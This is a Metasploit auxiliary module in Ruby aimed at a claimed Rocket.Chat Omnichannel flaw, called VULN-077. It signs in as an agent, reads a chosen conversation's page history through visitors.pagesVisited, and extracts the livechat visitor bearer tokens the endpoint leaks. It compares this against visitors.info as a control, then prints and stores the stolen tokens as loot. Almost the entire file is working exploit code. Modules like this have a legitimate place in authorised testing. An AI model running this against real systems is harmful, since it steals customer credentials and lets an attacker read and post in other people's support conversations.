class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat 9.1 Livechat visitor token disclosed by visitors.pagesVisited (VULN-077)',
        'Description' => %q{
          Rocket.Chat's Omnichannel identifies a website visitor by a bearer token
          rather than an account: whoever holds a conversation's visitor token can
          read that conversation and post into it as the customer. The product knows
          this and projects the token out of the visitor-info, contacts and
          chat-history responses, so that an agent cannot pick up another department's
          customers' credentials. livechat/visitors.pagesVisited returns the stored
          navigation messages whole, and each one carries the token in its navigation
          object. This module signs in as the agent the operator names, reads the page
          history of the conversation the operator names, and checks that
          visitors.info withholds the token from that same caller: a host is
          vulnerable when the page history hands over a token the info route refuses.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['GHSA', 'cqj7-h8cj-jmf2'],
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/livechat/visitors.pagesVisited']),
      OptString.new('USERNAME', [true, 'A valid account on the target', '']),
      OptString.new('PASSWORD', [true, 'That account\'s password', '']),
      OptString.new('ROOMID', [true, 'The Livechat room id whose page history to read', 'uBCF3TbEtTG4xqRTM']),
      OptString.new('VISITORID', [true, 'The same conversation\'s visitor id, used for the control request against visitors.info', '6b05e0d9e7422a44df31e2e2']),
      OptString.new('TOTPCODE', [false, 'The current second-factor code, when the account given has one enrolled', ''])
    ])
  end

  # Sign in with credentials the operator already has. A module never
  # creates an account, seeds data, or changes state to make itself work.
  # Rocket.Chat answers POST /api/v1/login with a token pair rather than a
  # cookie, so the pair is what every later request carries. TOTPCODE is for
  # an account with a second factor enrolled: the operator supplies the
  # current code with the password, as they would in any other client.
  def authenticate
    creds = { 'user' => datastore['USERNAME'], 'password' => datastore['PASSWORD'] }
    creds['code'] = datastore['TOTPCODE'] unless datastore['TOTPCODE'].to_s.empty?
    2.times do |attempt|
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(LOGIN_PATH),
        'ctype' => 'application/json',
        'data' => creds.to_json
      })
      if res && res.code == 200
        doc = parse_json(res)
        @auth_token = doc.dig('data', 'authToken')
        @user_id = doc.dig('data', 'userId')
        unless @auth_token.nil? || @user_id.nil?
          vprint_status("#{peer} - Signed in as #{datastore['USERNAME']} (user id #{@user_id})")
          return true
        end
      end
      sleep(2) if attempt.zero?   # ride out a transient per-route rate limit
    end
    false
  end

  def run
    unless authenticate
      fail_with(Failure::NoAccess, 'Could not sign in with the credentials given.')
    end

    res = pages_visited
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = res.code == 200 && !leaked_tokens(res).empty? && info_withholds_token?
    fail_with(Failure::NotVulnerable, 'VULN-077: the attack did not land') unless hit

    print_good("#{peer} - VULN-077: exploited")
    toks = leaked_tokens(res)
    print_good("#{peer} - recovered #{toks.length} visitor token(s) from the page history: #{toks.join(', ')}")
    print_line(res.body.to_s[0, 2048])
    path = store_loot('blue_spider.vuln_077', 'text/plain', rhost, res.body.to_s, 'vuln_077.txt', 'VULN-077 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-077 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  # The token is a bearer credential: whoever holds it reads the conversation
  # and posts as the customer. visitors.info projects it away (the fix for
  # GHSA-cqj7-h8cj-jmf2), so the control request is what makes this a finding
  # rather than a design: the same caller is refused the token on one route and
  # handed it on the other.
  def pages_visited
    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, datastore['ROOMID']),
      'headers' => { 'X-Auth-Token' => @auth_token, 'X-User-Id' => @user_id }
    })
  end

  def info_withholds_token?
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/api/v1/livechat/visitors.info'),
      'vars_get' => { 'visitorId' => datastore['VISITORID'] },
      'headers' => { 'X-Auth-Token' => @auth_token, 'X-User-Id' => @user_id }
    })
    return false unless res

    withheld = !res.body.to_s.include?('"token"')
    vprint_status("#{peer} - visitors.info for the same caller: HTTP #{res.code}, " \
                  "token withheld=#{withheld}")
    withheld
  end

  def leaked_tokens(res)
    (parse_json(res)['pages'] || []).map { |p| p.dig('navigation', 'token') }.compact.uniq
  end
end
